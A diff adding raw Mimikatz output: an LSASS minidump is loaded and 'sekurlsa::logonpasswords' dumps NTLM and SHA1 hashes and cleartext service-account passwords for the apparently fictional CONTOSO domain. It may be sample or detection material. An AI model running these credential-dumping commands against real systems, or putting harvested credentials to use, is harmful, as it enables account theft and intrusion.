@@ -1,0 +1,46 @@
+mimikatz # sekurlsa::minidump appsrv02-lsass.dmp
+Switch to MINIDUMP : 'appsrv02-lsass.dmp'
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 2841556 (00000000:002b5d94)
+Session           : RemoteInteractive from 2
+User Name         : asmith
+Domain            : CONTOSO
+Logon Server      : DC02
+Logon Time        : 6/22/2026 10:14:08 AM
+SID               : S-1-5-21-1993962763-4083295800-2358739571-1103
+        msv :
+         [00000003] Primary
+         * Username : asmith
+         * Domain   : CONTOSO
+         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
+         * SHA1     : 2b3c4d5e6f708192a3b4c5d6e7f8091223344556
+        wdigest :
+         * Username : asmith
+         * Domain   : CONTOSO
+         * Password : (null)
+        kerberos :
+         * Username : asmith
+         * Domain   : CONTOSO.COM
+         * Password : (null)
+        credman :
+         * Username : svc_deploy
+         * Domain   : appsrv02.contoso.com
+         * Password : Contoso!Deploy26
+
+Authentication Id : 0 ; 62841 (00000000:0000f579)
+Session           : Batch from 0
+User Name         : svc_task
+Domain            : CONTOSO
+Logon Time        : 6/22/2026 6:00:01 AM
+SID               : S-1-5-21-1993962763-4083295800-2358739571-1120
+        msv :
+         [00000003] Primary
+         * Username : svc_task
+         * Domain   : CONTOSO
+         * NTLM     : 5835048ce94ad0564e29a924a03510ef
+        wdigest :
+         * Username : svc_task
+         * Domain   : CONTOSO
+         * Password : T@sk-Sched-Contoso-2026
